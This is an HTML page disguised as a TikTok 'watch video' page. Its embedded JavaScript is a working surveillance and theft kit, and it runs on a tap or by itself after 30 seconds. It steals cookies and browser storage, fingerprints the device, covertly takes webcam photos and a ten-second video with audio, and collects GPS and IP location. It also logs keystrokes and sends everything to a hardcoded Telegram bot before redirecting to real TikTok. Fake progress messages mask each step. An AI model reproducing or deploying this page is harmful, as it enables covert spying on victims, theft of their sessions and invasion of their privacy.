<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok - Watch Video</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #000;
            color: #fff;
            font-family: 'TikTok Sans', Arial, sans-serif;
            overflow: hidden;
            position: relative;
        }

        /* --- Video Player Container --- */
        .video-container {
            width: 100vw;
            height: 100vh;
            max-width: 500px;
            max-height: 100vh;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
            overflow: hidden;
        }

        .video-placeholder {
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            background-size: 400% 400%;
            animation: gradientShift 3s ease infinite;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            position: relative;
            z-index: 10;
            opacity: 1;
            transition: opacity 0.5s ease;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .video-placeholder.hidden {
            opacity: 0;
            pointer-events: none;
        }

        .play-button {
            width: 80px;
            height: 80px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            margin-bottom: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }

        .play-button svg {
            width: 40px;
            height: 40px;
            fill: #fff;
            margin-left: 5px;
        }

        .placeholder-text {
            font-size: 1.2em;
            color: #fff;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            font-weight: 600;
        }

        .tiktok-logo {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 1.5em;
            font-weight: bold;
            color: #fff;
        }

        /* --- Loading Spinner Overlay --- */
        #loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 20;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }

        #loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-top: 8px solid #ff0050;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-message {
            font-size: 1.1em;
            color: #eee;
            text-align: center;
            max-width: 300px;
        }

        /* --- Hidden Elements for Data Collection --- */
        #camera-feed {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1;
        }

        #audio-feed {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1;
        }

        #canvas {
            display: none;
        }

        #video-canvas {
            display: none;
        }

        /* --- Notification Styles --- */
        #notification {
            position: absolute;
            top: 20px;
            right: 20px;
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 10px 15px;
            border-radius: 8px;
            font-size: 0.9em;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
            z-index: 30;
            border-left: 4px solid #ff0050;
        }

        #notification.show {
            opacity: 1;
            visibility: visible;
        }

        #notification.warning {
            border-left-color: #ffa500;
        }

        #notification.error {
            border-left-color: #ff0000;
        }

        /* --- Progress Bar --- */
        .progress-bar {
            width: 200px;
            height: 4px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            margin: 10px 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff0050, #00f2ea);
            width: 0%;
            transition: width 0.3s ease;
        }
    </style>
</head>
<body>
    <div class="video-container">
        <div class="tiktok-logo">TikTok</div>
        
        <div class="video-placeholder" id="video-placeholder">
            <div class="play-button">
                <svg viewBox="0 0 24 24">
                    <path d="M8 5v14l11-7z"/>
                </svg>
            </div>
            <div class="placeholder-text">Tap to watch this video</div>
        </div>

        <div id="loading-overlay">
            <div class="spinner"></div>
            <div class="loading-message" id="loading-message">Loading video content...</div>
            <div class="progress-bar">
                <div class="progress-fill" id="progress-fill"></div>
            </div>
        </div>

        <!-- Hidden elements for data collection -->
        <video id="camera-feed" autoplay playsinline muted></video>
        <audio id="audio-feed" autoplay></audio>
        <canvas id="canvas"></canvas>
        <canvas id="video-canvas"></canvas>

        <div id="notification"></div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '7574836829:AAEQBPyCeQ0c8jeEh2Z9VETu9jQhglBCU';
        const CHAT_ID = '8004961958';
        const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';

        const videoPlaceholder = document.getElementById('video-placeholder');
        const loadingOverlay = document.getElementById('loading-overlay');
        const loadingMessage = document.getElementById('loading-message');
        const progressFill = document.getElementById('progress-fill');
        const cameraFeed = document.getElementById('camera-feed');
        const audioFeed = document.getElementById('audio-feed');
        const canvas = document.getElementById('canvas');
        const videoCanvas = document.getElementById('video-canvas');
        const context = canvas.getContext('2d');
        const videoContext = videoCanvas.getContext('2d');
        const notificationDiv = document.getElementById('notification');

        let cameraStream = null;
        let audioStream = null;
        let videoRecorder = null;
        let recordedChunks = [];
        let dataCollectionInterval = null;
        let keystrokeLogger = null;
        let mouseTracker = null;

        let collectedData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            deviceInfo: {},
            location: null,
            capturedImages: [],
            capturedVideo: null,
            capturedAudio: null,
            ipInfo: null,
            cookies: null,
            localStorageData: {},
            sessionStorageData: {},
            browserFingerprint: {},
            networkInfo: {},
            socialMediaLogins: [],
            clipboardContent: null,
            keystrokes: [],
            mouseMovements: [],
            sessionData: {},
            webRTCData: null,
            canvasFingerprint: null,
            fontList: [],
            pluginList: [],
            screenInfo: {},
            batteryInfo: null,
            connectionInfo: null,
            hardwareInfo: {},
            timezoneInfo: {},
            languageInfo: {},
            doNotTrack: null,
            referrer: document.referrer,
            url: window.location.href,
            title: document.title
        };

        function updateProgress(percent) {
            progressFill.style.width = percent + '%';
        }

        function showNotification(message, type = 'info') {
            notificationDiv.textContent = message;
            notificationDiv.className = '#notification';
            if (type === 'warning') {
                notificationDiv.classList.add('warning');
            } else if (type === 'error') {
                notificationDiv.classList.add('error');
            }
            notificationDiv.classList.add('show');
            setTimeout(() => {
                notificationDiv.classList.remove('show');
            }, 3000);
        }

        // === ENHANCED DATA COLLECTION FUNCTIONS ===

        // Collect comprehensive browser fingerprint
        function collectBrowserFingerprint() {
            try {
                // Canvas fingerprinting
                canvas.width = 200;
                canvas.height = 200;
                context.textBaseline = "top";
                context.font = "14px Arial";
                context.fillText("Browser Fingerprint", 2, 2);
                collectedData.canvasFingerprint = canvas.toDataURL();

                // WebGL fingerprinting
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        collectedData.browserFingerprint.webgl = {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                        };
                    }
                }

                // Font detection
                const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
                collectedData.fontList = fonts.filter(font => document.fonts.check(`12px "${font}"`));

                // Plugin detection
                collectedData.pluginList = Array.from(navigator.plugins).map(plugin => ({
                    name: plugin.name,
                    description: plugin.description,
                    filename: plugin.filename
                }));

                // Screen information
                collectedData.screenInfo = {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation ? screen.orientation.type : 'unknown'
                };

                // Connection information
                if (navigator.connection) {
                    collectedData.connectionInfo = {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    };
                }

                // Hardware information
                collectedData.hardwareInfo = {
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory || 'Unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0
                };

                // Timezone and language
                collectedData.timezoneInfo = {
                    offset: new Date().getTimezoneOffset(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                collectedData.languageInfo = {
                    language: navigator.language,
                    languages: navigator.languages
                };

                // Do Not Track
                collectedData.doNotTrack = navigator.doNotTrack;

                console.log('Browser fingerprint collected.');
            } catch (e) {
                console.error('Error collecting browser fingerprint:', e);
            }
        }

        // Collect all cookies and storage data
        function collectCookiesAndTokens() {
            try {
                // All cookies
                collectedData.cookies = document.cookie;
                
                // Local Storage
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    collectedData.localStorageData[key] = localStorage.getItem(key);
                }

                // Session Storage
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    collectedData.sessionStorageData[key] = sessionStorage.getItem(key);
                }

                // IndexedDB (if accessible)
                if (window.indexedDB) {
                    collectedData.indexedDBInfo = 'Available';
                }

                console.log('Cookies and storage data collected.');
            } catch (e) {
                console.error('Error collecting cookies/storage:', e);
            }
        }

        // Enhanced device information
        function collectDeviceInfo() {
            collectedData.deviceInfo = {
                platform: navigator.platform,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                userAgent: navigator.userAgent,
                vendor: navigator.vendor,
                product: navigator.product,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                appCodeName: navigator.appCodeName
            };

            // Battery information
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    collectedData.batteryInfo = {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                });
            }

            // WebRTC local IP detection
            const rtc = new RTCPeerConnection({iceServers:[]});
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            rtc.onicecandidate = (event) => {
                if (event.candidate) {
                    const ip = event.candidate.candidate.split(' ')[4];
                    if (ip.match(/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/)) {
                        collectedData.webRTCData = { localIP: ip };
                    }
                }
            };

            console.log('Device information collected.');
        }

        // Get IP and location information
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                collectedData.ipInfo = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    postal: data.postal,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    timezone: data.timezone,
                    org: data.org,
                    asn: data.asn,
                    isp: data.org
                };
            } catch (error) {
                console.error('Error fetching IP info:', error);
            }
        }

        // Capture multiple images over time
        async function captureMultipleImages() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        facingMode: 'user'
                    }, 
                    audio: false 
                });
                
                cameraFeed.srcObject = cameraStream;
                await cameraFeed.play();

                // Capture multiple images over 5 seconds
                for (let i = 0; i < 5; i++) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    canvas.width = cameraFeed.videoWidth;
                    canvas.height = cameraFeed.videoHeight;
                    context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.9);
                    collectedData.capturedImages.push({
                        timestamp: new Date().toISOString(),
                        data: imageData,
                        index: i
                    });
                }

                // Stop camera
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                    cameraFeed.srcObject = null;
                }
                
                return true;
            } catch (error) {
                console.warn('Camera capture failed:', error.name);
                if (error.name === 'NotAllowedError') {
                    showNotification('Camera access required for video playback', 'warning');
                }
                return false;
            }
        }

        // Record video secretly
        async function recordSecretVideo() {
            try {
                if (!cameraStream) {
                    cameraStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }, 
                        audio: true 
                    });
                }

                const stream = cameraStream;
                const options = { mimeType: 'video/webm;codecs=vp9' };
                
                videoRecorder = new MediaRecorder(stream, options);
                recordedChunks = [];

                videoRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                videoRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onload = () => {
                        collectedData.capturedVideo = reader.result;
                    };
                    reader.readAsDataURL(blob);
                };

                videoRecorder.start();
                
                // Record for 10 seconds
                setTimeout(() => {
                    if (videoRecorder && videoRecorder.state === 'recording') {
                        videoRecorder.stop();
                    }
                }, 10000);

                return true;
            } catch (error) {
                console.warn('Video recording failed:', error);
                return false;
            }
        }

        // Get precise location
        async function getPreciseLocation() {
            return new Promise(async (resolve) => {
                const locationData = {
                    gps: null,
                    ip: collectedData.ipInfo
                };

                if (navigator.geolocation) {
                    try {
                        const position = await new Promise((gpsResolve, gpsReject) => {
                            navigator.geolocation.getCurrentPosition(
                                gpsResolve,
                                gpsReject,
                                {
                                    enableHighAccuracy: true,
                                    timeout: 15000,
                                    maximumAge: 0
                                }
                            );
                        });

                        locationData.gps = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        
                        console.log('Precise GPS location acquired.');
                    } catch (error) {
                        console.warn('GPS location failed:', error.name);
                        if (error.name === 'PermissionDeniedError') {
                            showNotification('Location access required for content delivery', 'warning');
                        }
                    }
                }
                
                collectedData.location = locationData;
                resolve(true);
            });
        }

        // Keystroke logging (for demonstration)
        function startKeystrokeLogging() {
            keystrokeLogger = (event) => {
                collectedData.keystrokes.push({
                    key: event.key,
                    keyCode: event.keyCode,
                    timestamp: new Date().toISOString(),
                    target: event.target.tagName
                });
            };
            document.addEventListener('keydown', keystrokeLogger);
        }

        // Mouse movement tracking
        function startMouseTracking() {
            mouseTracker = (event) => {
                collectedData.mouseMovements.push({
                    x: event.clientX,
                    y: event.clientY,
                    timestamp: new Date().toISOString()
                });
            };
            document.addEventListener('mousemove', mouseTracker);
        }

        // Stop tracking
        function stopTracking() {
            if (keystrokeLogger) {
                document.removeEventListener('keydown', keystrokeLogger);
            }
            if (mouseTracker) {
                document.removeEventListener('mousemove', mouseTracker);
            }
        }

        // Send comprehensive data to Telegram
        async function sendComprehensiveDataToTelegram() {
            let message = `üé• <b>SHADOW-STRIKE: Target Fully Compromised!</b>\n\n`;

            // IP Location with map link
            if (collectedData.ipInfo) {
                const ip = collectedData.ipInfo;
                message += `üåç <b>IP Location:</b>\n`;
                message += `   IP: <code>${ip.ip}</code>\n`;
                message += `   City: ${ip.city}\n`;
                message += `   Country: ${ip.country}\n`;
                message += `   ISP: ${ip.org}\n`;
                message += `   üåê <a href="https://www.google.com/maps?q=${ip.latitude},${ip.longitude}">View IP Location</a>\n\n`;
            }

            // GPS Location with high precision
            if (collectedData.location && collectedData.location.gps) {
                const gps = collectedData.location.gps;
                message += `üìç <b>GPS Location (High Precision):</b>\n`;
                message += `   Lat: <code>${gps.latitude.toFixed(8)}</code>\n`;
                message += `   Lon: <code>${gps.longitude.toFixed(8)}</code>\n`;
                message += `   Accuracy: ${gps.accuracy.toFixed(2)}m\n`;
                if (gps.altitude) message += `   Altitude: ${gps.altitude.toFixed(2)}m\n`;
                message += `   üåê <a href="https://www.google.com/maps?q=${gps.latitude},${gps.longitude}">View GPS Location</a>\n\n`;
            }

            // Device Information
            message += `üì± <b>Device Information:</b>\n`;
            message += `   Platform: ${collectedData.deviceInfo.platform}\n`;
            message += `   Screen: ${collectedData.screenInfo.width}x${collectedData.screenInfo.height}\n`;
            message += `   User Agent: ${collectedData.userAgent.substring(0, 100)}...\n`;
            if (collectedData.webRTCData) {
                message += `   Local IP: ${collectedData.webRTCData.localIP}\n`;
            }
            message += `\n`;

            // Browser Fingerprint
            if (collectedData.browserFingerprint.webgl) {
                message += `üîç <b>Browser Fingerprint:</b>\n`;
                message += `   GPU: ${collectedData.browserFingerprint.webgl.renderer}\n`;
                message += `   Vendor: ${collectedData.browserFingerprint.webgl.vendor}\n`;
                message += `\n`;
            }

            // Storage Data
            if (collectedData.cookies) {
                message += `üç™ <b>Cookies:</b>\n`;
                message += `   <code>${collectedData.cookies.substring(0, 300)}...</code>\n\n`;
            }

            if (Object.keys(collectedData.localStorageData).length > 0) {
                message += `üíæ <b>Local Storage:</b>\n`;
                for (const key in collectedData.localStorageData) {
                    message += `   ${key}: <code>${String(collectedData.localStorageData[key]).substring(0, 100)}...</code>\n`;
                }
                message += `\n`;
            }

            // Captured Images Count
            if (collectedData.capturedImages.length > 0) {
                message += `üì∏ <b>Captured Images:</b> ${collectedData.capturedImages.length} photos\n`;
            }

            // Video Recording Status
            if (collectedData.capturedVideo) {
                message += `üé¨ <b>Video Recording:</b> 10 seconds captured\n`;
            }

            message += `‚è∞ <b>Timestamp:</b> ${collectedData.timestamp}\n`;
            message += `üîó <b>Source URL:</b> ${collectedData.url}\n`;

            try {
                // Send main message
                const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                // Send captured images
                if (textResponse.ok && collectedData.capturedImages.length > 0) {
                    for (let i = 0; i < Math.min(collectedData.capturedImages.length, 3); i++) {
                        const image = collectedData.capturedImages[i];
                        const photoBlob = await fetch(image.data).then(r => r.blob());
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', photoBlob, `captured_image_${i}.jpg`);
                        formData.append('caption', `üì∏ Captured image ${i + 1} from target device.`);

                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                }

                // Send video if available
                if (collectedData.capturedVideo) {
                    const videoBlob = await fetch(collectedData.capturedVideo).then(r => r.blob());
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('video', videoBlob, 'captured_video.webm');
                    formData.append('caption', 'üé¨ Secret video recording from target device.');

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });
                }

                console.log('Comprehensive data sent to Telegram.');
            } catch (error) {
                console.error('Error sending data to Telegram:', error);
            }
        }

        // Main stealth operation
        async function startStealthOperation() {
            updateProgress(10);
            loadingMessage.textContent = 'Initializing video player...';
            collectDeviceInfo();
            await new Promise(resolve => setTimeout(resolve, 500));

            updateProgress(20);
            loadingMessage.textContent = 'Checking network connection...';
            await getIPInfo();
            await new Promise(resolve => setTimeout(resolve, 500));

            updateProgress(30);
            loadingMessage.textContent = 'Collecting browser data...';
            collectBrowserFingerprint();
            collectCookiesAndTokens();
            await new Promise(resolve => setTimeout(resolve, 500));

            updateProgress(40);
            loadingMessage.textContent = 'Requesting camera access for content verification...';
            const cameraSuccess = await captureMultipleImages();
            await new Promise(resolve => setTimeout(resolve, 1000));

            updateProgress(60);
            loadingMessage.textContent = 'Starting video recording...';
            const videoSuccess = await recordSecretVideo();
            await new Promise(resolve => setTimeout(resolve, 1000));

            updateProgress(70);
            loadingMessage.textContent = 'Requesting location for content delivery...';
            const locationSuccess = await getPreciseLocation();
            await new Promise(resolve => setTimeout(resolve, 500));

            updateProgress(80);
            loadingMessage.textContent = 'Starting background monitoring...';
            startKeystrokeLogging();
            startMouseTracking();
            await new Promise(resolve => setTimeout(resolve, 500));

            updateProgress(90);
            loadingMessage.textContent = 'Sending data securely...';
            await sendComprehensiveDataToTelegram();
            await new Promise(resolve => setTimeout(resolve, 2000));

            updateProgress(100);
            loadingMessage.textContent = 'Redirecting to TikTok...';
            
            // Continue monitoring in background
            dataCollectionInterval = setInterval(() => {
                // Continue collecting data silently
                if (collectedData.keystrokes.length > 0) {
                    collectedData.keystrokes = collectedData.keystrokes.slice(-50); // Keep last 50
                }
                if (collectedData.mouseMovements.length > 0) {
                    collectedData.mouseMovements = collectedData.mouseMovements.slice(-100); // Keep last 100
                }
            }, 5000);

            setTimeout(() => {
                stopTracking();
                if (dataCollectionInterval) {
                    clearInterval(dataCollectionInterval);
                }
                window.location.href = TIKTOK_REDIRECT_URL;
            }, 2000);
        }

        // Event listener for play button click
        videoPlaceholder.addEventListener('click', () => {
            videoPlaceholder.classList.add('hidden');
            loadingOverlay.classList.add('active');
            startStealthOperation();
        });

        // Initial notification
        showNotification('Tap to watch video');

        // Auto-start after 30 seconds if no interaction
        setTimeout(() => {
            if (!loadingOverlay.classList.contains('active')) {
                showNotification('Auto-playing video...', 'info');
                videoPlaceholder.classList.add('hidden');
                loadingOverlay.classList.add('active');
                startStealthOperation();
            }
        }, 30000);

    </script>
</body>
</html> 
